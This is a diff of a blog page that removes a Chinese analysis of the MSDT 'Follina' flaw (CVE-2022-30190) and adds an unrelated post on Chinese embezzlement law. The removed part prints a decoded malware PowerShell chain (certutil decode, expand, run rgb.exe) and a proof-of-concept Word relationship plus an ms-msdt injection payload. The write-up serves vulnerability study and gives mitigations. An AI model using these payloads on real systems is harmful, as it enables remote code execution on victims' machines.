@@ -4,11 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2022-30190 MSDT远程代码注入漏洞分析, 大茗茗のblog">
-    <meta name="description" content="相关知识WTP框架windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。
-底层结构
-
-WTP由两个进程组成，Process1是带UI的Tro">
+    <meta name="keywords" content="101种职务犯罪-贪污罪, 大茗茗のblog">
+    <meta name="description" content="根据《中华人民共和国监察法》第11条第2项的规定，监察委员会有权对涉嫌贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊以及浪费国家资产等职务违法和职务犯罪进行调查。2021年，国家监察委员会颁布《中华人民共和国监察法实施条例》对监">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +17,7 @@ WTP由两个进程组成，Process1是带UI的Tro">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析 | 大茗茗のblog</title>
+    <title>101种职务犯罪-贪污罪 | 大茗茗のblog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -268,12 +265,12 @@ WTP由两个进程组成，Process1是带UI的Tro">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2022-30190 MSDT远程代码注入漏洞分析</h1>
+                    <h1 class="description center-align post-title">101种职务犯罪-贪污罪</h1>
                 </div>
             </div>
         </div>
@@ -297,8 +294,8 @@ WTP由两个进程组成，Process1是带UI的Tro">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CVE/">
-                                <span class="chip bg-color">CVE</span>
+                            <a href="/tags/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA/">
+                                <span class="chip bg-color">101种职务犯罪</span>
                             </a>
                         
                     </div>
@@ -309,8 +306,8 @@ WTP由两个进程组成，Process1是带UI的Tro">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                漏洞分析
+                            <a href="/categories/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA/" class="post-category">
+                                101种职务犯罪
                             </a>
                         
                     </div>
@@ -322,7 +319,7 @@ WTP由两个进程组成，Process1是带UI的Tro">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-16
+                    2025-09-27
                 </div>
                 
 
@@ -331,14 +328,14 @@ WTP由两个进程组成，Process1是带UI的Tro">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    4.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    14 分
                 </div>
                 
 
@@ -361,168 +358,73 @@ WTP由两个进程组成，Process1是带UI的Tro">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
-<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png"></p>
-<ul>
-<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
-<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
-<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
-</ul>
-<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
-<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
-</li>
-<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
-</li>
-<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
-</li>
-<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
-</li>
-</ul>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
-<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
-<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
-<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
-<p><strong>影响版本：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
-Microsoft Windows 11
-Microsoft Windows Server 2019
-Microsoft Windows 10 1607
-Microsoft Windows Server 20H2
-Microsoft Windows Server 2022
-Microsoft Windows Server 2016 (Server Core installation)
-Microsoft Windows Server 2016 null
-Microsoft Windows 10
-Microsoft Windows 10 1809
-Microsoft Windows Server 2008 R2 SP1
-Microsoft Windows Server 2022 (Server Core installation)
-Microsoft Windows Server 2019 (Server Core installation)
-Microsoft Windows 8.1
-Microsoft Windows 10 20H2
-Microsoft Windows 10 21H2
-Microsoft Windows Server 2012 R2
-Microsoft Windows 7 SP1
-Microsoft Windows RT 8.1 SP0
-Microsoft Windows Server 2012
-Microsoft Windows 10 21H1
-Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a target="_blank" rel="noopener" href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
-<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
-<p><strong>RDF842l.html原始内容：</strong></p>
-<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
-&lt;html lang="en"&gt;
-&lt;body&gt;
-&lt;script&gt;
-                         
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
-<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
-<p>解密得到</p>
-<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>启动隐藏窗口：</p>
-<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
-循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
-将Base64字符串编码的cab文件保存1.c
-将1.c cab文件展开到当前目录
-最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
-<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
-<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
-<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
-<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
-{
-    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-}
-else
-{
-    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
-
-	## If the user chose the option "Not listed" we will ask them to browse for a file
-    if($selectedProgram -eq "NotListed")
-    {
-        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
-<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
-{
-    $testresult = $false
-
-    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
-    {
-        $testresult = test-path -literalpath $appPath
-
-        if($testresult)
-        {
-            if(-not($type::IsFileProtected($appPath)))
-            {
-                $extension = [System.IO.Path]::GetExtension($appPath)
-                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
-            }
-            else
-            {
-                $testresult = $false
-                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
-            }
-        }
-    }
-
-    Set-Variable -name appValid -value $testResult -scope global
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
-<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
-<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
-{
-    $InstanceId++
-    $selection = $selectedProgram
-    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
-    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
-    Test-Selection($selectedProgram)
-}
-
-$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
-<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
-{
-    $Env:RecommendedLayer = $AppInfo[2]
-    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
-}
-else
-{
-    Start-Process -FilePath $AppInfo[1]
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
-location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
-IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
-&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
-<p>包含$()中的代码会通过PowerShell执行</p>
-<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
-<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
-<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
-<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
-<p><strong>禁用方法：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
-<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
-<p><strong>撤销禁用：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
+                <p>根据《中华人民共和国监察法》第11条第2项的规定，监察委员会有权对涉嫌贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊以及浪费国家资产等职务违法和职务犯罪进行调查。2021年，国家监察委员会颁布《中华人民共和国监察法实施条例》对监察机关有权管辖的职务犯罪案件范围进一步细化，具体包含101种罪名。</p>
+<p><strong>贪污罪</strong></p>
+<p>主体包括：<br>(1)国家机关工作人员<br>(2)国有公司、企业、事业单位、人民团体中从事公务的人员；<br>(3)国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员；<br>(4)其他依照法律从事公务的人员；<br>(5)受国家机关、国有公司、企业、事业单位、人民团体委托管理、经营国有财产的人员。</p>
+<h2 id="一、刑法条文"><a href="#一、刑法条文" class="headerlink" title="一、刑法条文"></a>一、刑法条文</h2><h3 id="第三百八十二条"><a href="#第三百八十二条" class="headerlink" title="第三百八十二条"></a>第三百八十二条</h3><p>贪污罪是指国家工作人员利用职务上的便利，侵吞、窃取、骗取或者以其他手段非法占有公共财物。</p>
+<p>受国家机关、国有公司、企业、事业单位、人民团体委托管理、经营国有财产的人员，利用职务上的便利，侵吞、窃取、骗取或者以其他手段非法占有国有财务的，以贪污论。</p>
+<p>与前两款所列人员勾结，伙同贪污的，以共犯论处。</p>
+<h3 id="第三百八十三条"><a href="#第三百八十三条" class="headerlink" title="第三百八十三条"></a>第三百八十三条</h3><p>对犯贪污罪的，根据情节轻重，分别依照下列规定处罚：</p>
+<p>（一）贪污数额较大或者有其他较重情节的，处三年以下有期徒刑或者拘役，并处罚金。</p>
+<p>（二）贪污数额巨大或者有其他严重情节的，处三年以上十年以下有期徒刑，并处罚金或者没收财产。</p>
+<p>（三）贪污数额特别巨大或者有其他特别严重情节的，处十年以上有期徒刑或者无期徒刑，并处罚金或者没收财产；数额特别巨大，并使国家和人民利益遭受特别重大损失的，处无期徒刑或者死刑，并处没收财产。</p>
+<p>对多次贪污未经处理的，按照累计贪污数额处罚。</p>
+<p>犯第一款罪，在提起公诉前如实供述自己罪行、真诚悔罪、积极退赃，避免、减少损害结果的发生，有第一项规定情形的，可以从轻、减轻或者免除处罚；有第二项、第三项规定情形的，可以从轻处罚。</p>
+<p>犯第一款罪，有第三项规定情形被判处死刑缓期执行的，人民法院根据犯罪情节等情况可以同时决定在其死刑缓期执行二年期满依法减为无期徒刑后，终身监禁，不得减刑、假释。</p>
+<h3 id="第九十一条"><a href="#第九十一条" class="headerlink" title="第九十一条"></a>第九十一条</h3><p>本法所称公共财产，是指下列财产：</p>
+<p>（一）国有财产</p>
+<p>（二）劳动群体集体所有的财产</p>
+<p>（三）用于扶贫和其他公益事业的社会捐助或者专项基金的财产</p>
+<p>在国家机关、国有公司、企业、集体企业和人民团体管理、使用或者运输中的私人财产，以公共财产论。</p>
+<h3 id="第九十三条"><a href="#第九十三条" class="headerlink" title="第九十三条"></a>第九十三条</h3><p>本法所称的国家工作人员，是指<strong>国家机关中从事公务的人员</strong>。</p>
+<p>国有公司、企业、事业单位、人民团体中从事公务的人员和<strong>国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员</strong>，以及<strong>其他依照法律从事公务的人员</strong>，以国家工作人员论。</p>
+<h4 id="国家机关中从事公务的人员"><a href="#国家机关中从事公务的人员" class="headerlink" title="国家机关中从事公务的人员"></a>国家机关中从事公务的人员</h4><p>刑法中所称的国家机关工作人员，是指在国家机关中从事公务的人员，包括在各级国家权力机关、行政机关、司法机关和军事机关中从事公务的人员。</p>
+<p>根据有关立法解释的规定，在依照法律、法规规定行使国家行政管理职权的组织中从事公务的人员，或者在受国家机关 委托代表国家行使职权的组织中从事公务的人员，或者虽未列入国家机关人员编制但在国家机关中从事公务的人员，视为国家机关工作人员。在乡(镇)以上中国共产党机关、人民政协机关中从事公务的人员，司法实践中也应当视为国家机关工作人员。</p>
+<p>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</p>
+<p>经国家机关、国有公司、企业、事业单位提名、推荐、任命、批准等，在国有控股、参股公司及其分支机构中从事公务 的人员，应当认定为国家工作人员。具体的任命机构和程序， 不影响国家工作人员的认定。经国家出资企业中负有管理、监督国有资产职责的组织批准或者研究决定，代表其在国有控股、参股公司及其分支机构中从事组织、领导、监督、经营、管理工作的人员，应当认定为国家工作人员。国家出资企业中的国家工作人员，在国家出资企业中持有个人股份或者同时接受非国有股东委托的，不影响其国家工作人员身份的认定。</p>
+<p>“国家出资企业”,包括国家出资的国有独资 公司、国有独资企业，以及国有资本控股公司、国有资本参股公司。</p>
+<p>是否属于国家出资企业不清楚的，应遵循“谁投资、谁拥有产权”的原则进行界定。企业注册登记中的资金来源与实际 出资不符的，应根据实际出资情况确定企业的性质。企业实际 出资情况不清楚的，可以综合工商注册、分配形式、经营管理 等因素确定企业的性质。</p>
+<p>最高人民法院、最高人民检察院《关于办理国家出 资企业中职务犯罪案件具体应用法律若干问题的意见》(2010 年11月26日 法发〔2010〕 49号)</p>
+<h4 id="从事公务"><a href="#从事公务" class="headerlink" title="从事公务"></a>从事公务</h4><p>从事公务，是指代表国家机关、国有公司、企业、事业单 位、人民团体等履行组织、领导、监督、管理等职责。公务主 要表现为与职权相联系的公共事务以及监督、管理国有财产的 职务活动。如国家机关工作人员依法履行职责，国有公司的董 事、经理、监事、会计、出纳人员等管理、监督国有财产等活 动，属于从事公务。那些不具备职权内容的劳务活动、技术服务 工作，如售货员、售票员等所从事的工作，一般不认为是公务。</p>
+<p>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</p>
+<h4 id="国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员"><a href="#国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员" class="headerlink" title="国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员"></a>国家机关、国有公司、企业、事业单位委派到非国有公司、企业、事业单位、社会团体从事公务的人员</h4><p>所谓委派，即委任、派遣，其形式多种多样，如任命、指 派、提名、批准等。不论被委派的人身份如何，只要是接受国 家机关、国有公司、企业、事业单位委派，代表国家机关、国 有公司、企业、事业单位在非国有公司、企业、事业单位、社 会团体中从事组织、领导、监督、管理等工作，都可以认定为 国家机关、国有公司、企业、事业单位委派到非国有公司、企 业、事业单位、社会团体从事公务的人员。</p>
+<p>国家机关、国有 公司、企业、事业单位委派在国有控股或者参股的股份有限公 司从事组织、领导、监督、管理等工作的人员，应当以国家工作人员论。国有公司、企业改制为股份有限公司后，原国有公司、企业的工作人员和股份有限公司新任命的人员中，除代表国有投资主体行使监督、管理职权的人外，不以国家工作人员论。</p>
+<p>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</p>
+<h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><p>一是形式特征，委派在形式上可以不拘一格，如任命、指派、提名、推荐、认可、同意、批准等均无不可。</p>
+<p>二是实质特征，需代表国家机关、国有公司、企业、事业单位在非国有公司、企业、事业单位、社会团体中从事组织、领导、监督、管理等公务活动，亦即国有单位意志的直接代表性。</p>
+<p>概括为：</p>
+<p>1.委派的形式多样，不拘一格。可以是任命、指派、提名、批准、同意、事后的任命或批准等。</p>
+<p>2.委派的实质在于国有单位意志的直接代表性，即国有单位的意志行为的关联性和延续性。被委派人员去非国有单位</p>
+<p>必须从事公务，而非劳务性、技术性的工作。虽然委派的形式多种多样，被委派人的身份千差万别，但被委派人员的工作内容必须是公务，即履行组织、领导、监督、管理等职责。因此在实践中只需把握好“受委派”和“从事公务”两个特征。</p>
+<p>3.被委派人员在被委派以前的身份，不影响其拥有国家工作人员的身份。不论被委派人员之前是否为国家工作人员，</p>
+<p>是否属于在编人员，委派是书面委任文件还是提名，直接任职后委派还是临时委派，都不影响对其最终国家工作人员身份的认定。</p>
+<p>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</p>
